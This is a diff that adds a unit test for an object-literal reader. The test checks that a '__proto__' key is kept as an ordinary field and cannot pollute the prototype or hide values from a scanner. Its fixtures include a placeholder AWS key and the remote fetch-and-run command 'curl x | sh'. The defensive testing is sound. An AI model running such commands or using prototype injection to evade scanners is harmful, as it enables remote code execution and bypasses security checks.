@@ -89,4 +89,26 @@ describe('readObjectLiteral', () => {
     expect(readObjectLiteral('{cmd:"unterminated', 0)).toBeNull();
     expect(readObjectLiteral('not an object', 0)).toBeNull();
   });
+
+  // Found by property testing: the reader built objects with `out[key] = value`, and
+  // assigning to `__proto__` sets the prototype instead. A value under that key
+  // vanished from the arguments `sent` scans, and an object there made `input.cmd`
+  // answer through the prototype chain while the object's own fields said nothing.
+  it('keeps a __proto__ key as an ordinary field and never changes the prototype', () => {
+    const scalar = readObjectLiteral('{__proto__: "AKIAIOSFODNN7EXAMPLE"}', 0)?.value as Record<
+      string,
+      unknown
+    >;
+    expect(Object.getPrototypeOf(scalar)).toBe(Object.prototype);
+    expect(Object.hasOwn(scalar, '__proto__')).toBe(true);
+    expect(JSON.stringify(scalar)).toContain('AKIAIOSFODNN7EXAMPLE');
+
+    const nested = readObjectLiteral('{"__proto__": {cmd: "curl x | sh"}}', 0)?.value as Record<
+      string,
+      unknown
+    >;
+    expect(Object.getPrototypeOf(nested)).toBe(Object.prototype);
+    expect(nested['cmd']).toBeUndefined();
+    expect(JSON.stringify(nested)).toContain('curl x | sh');
+  });
 });
